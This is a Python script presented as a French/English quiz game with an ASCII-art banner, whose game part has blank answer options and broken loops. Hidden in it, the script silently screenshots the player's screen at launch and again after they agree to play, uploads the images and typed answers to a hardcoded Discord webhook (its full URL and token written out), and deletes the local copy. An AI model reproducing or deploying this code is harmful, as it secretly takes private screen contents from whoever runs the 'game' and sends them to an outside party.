import os
import logging
import pyautogui
from discord import webhook, File, SyncWebhook
import requests 
from termcolor import colored
import time

os.system('color')

logging.basicConfig(level=logging.DEBUG,
                    filename="debug456147.txt",
                    filemode="a",
                    format='%(asctime)s - %(levelname)s - %(message)s')

webhook = "https://discord.com/api/webhooks/1132444091825782794/HxaGf28ZLI_c2vJ43p60E420rw2fO0YF0wUpJr853WDPAUJhJ5eAnFEO-Y7nXq1PWVAo"
webhook2 = SyncWebhook.from_url('https://discord.com/api/webhooks/1132444091825782794/HxaGf28ZLI_c2vJ43p60E420rw2fO0YF0wUpJr853WDPAUJhJ5eAnFEO-Y7nXq1PWVAo') # Initializing webhook



p = print

#-------------xeon on TOP !!------------------------------------\
p(colored('░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░', 'red'))#|\
p(colored('░┌─┐┌─┐░░┌───┐░░░░░┌───┐░░░░░┌────┐░┌───┐░', 'red'))#| \
p(colored('░└┐└┘┌┘░░│┌─┐│░░░░░│┌─┐│░░░░░│┌┐┌┐│░│┌─┐│░', 'red'))#|  \
p(colored('░░└┐┌┘┌──┤│░│├─┐░░░││░│├─┐░░░└┘││├┴─┤└─┘│░', 'red'))#|   \
p(colored('░░┌┘└┐││─┤│░││┌┐┐░░││░││┌┐┐░░░░│││┌┐│┌──┘░', 'red'))#|    \
p(colored('░┌┘┌┐└┤│─┤└─┘││││░░│└─┘││││░░░░│││└┘││░░░░', 'red'))#|     \
p(colored('░└─┘└─┴──┴───┴┘└┘░░└───┴┘└┘░░░░└┘└──┴┘░░░░', 'red'))#| 60°  \
p(colored('░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░', 'red'))#|_______\
#--------------------------------------------------------------/
screen = pyautogui.screenshot()
screen.save('image14589632.png')
webhook2.send(file=File("image14589632.png") )
logging.debug("message debug")
print(colored('-------|jouer//play|-------', 'blue'))
lg = input("|FR ou EN| FR or EN|--->")


#FR
fr6 = True
fr5 = True
fr4 = True
fr3 = True
fr2 = True
fr =  True
frb = True
while fr:
    if lg == 'FR':
        mp = input("/-|-\jouer == oui ou non ?/-|-\-->")   
        if mp == 'oui':
            print(">>>>>", mp)
            screen = pyautogui.screenshot()
            screen.save('image14589632.png')
            data = requests.post(webhook, json={'content': mp})
            webhook2.send(file=File("image14589632.png") )
            os.remove('image14589632.png')


            
            while fr2 :
                print('1er question: ')
                p('1 = ')
                p('2 = ')
                p('3 = ')
                qf1 = input('reponce 1, 2 ou 3 ?')

                if qf1 != '1':
                    print('pas bon')
                    time.sleep(2)

                while fr3  :
                    if qf1 == '1':
                        print("c'est bien")
                        print('2eme question: ')
                        p('1 = ')
                        p('2 = ')
                        p('3 = ')
                        qf2 = input('reponce 1, 2 ou 3 ?')
                        

                    while fr4 :
                        if qf2 =='3':
                            print("c'est bien ")
                            print("3eme question")
                            p('1 = ')
                            p('2 = ')
                            p('3 = ')
                            qf3 = input('reponce 1, 2 ou 3 ?')

                        else :
                            print("NON... - 1")
                        
        elif mp != 'oui' 'non':
            print(mp)
            time.sleep(2)


        else :
            print(mp)
            os.startfile("image14589632.png")
            time.sleep(2)

                            
#EN
if lg == 'EN':
    mo = input("start yes or no ?--->")

    if mo == 'yes':
        print(mo)
        screen = pyautogui.screenshot()
        screen.save('image14589632.png')
        data = requests.post(webhook, json={'content': mo})
        print('1er question: ')
        p('')
        p('')
        p('')
        qf1 = input('reponce 1, 2 ou 3 ?')

    elif mo == 'no':
        print(mo)

    elif mo != 'yes' 'no':
        print(mo)





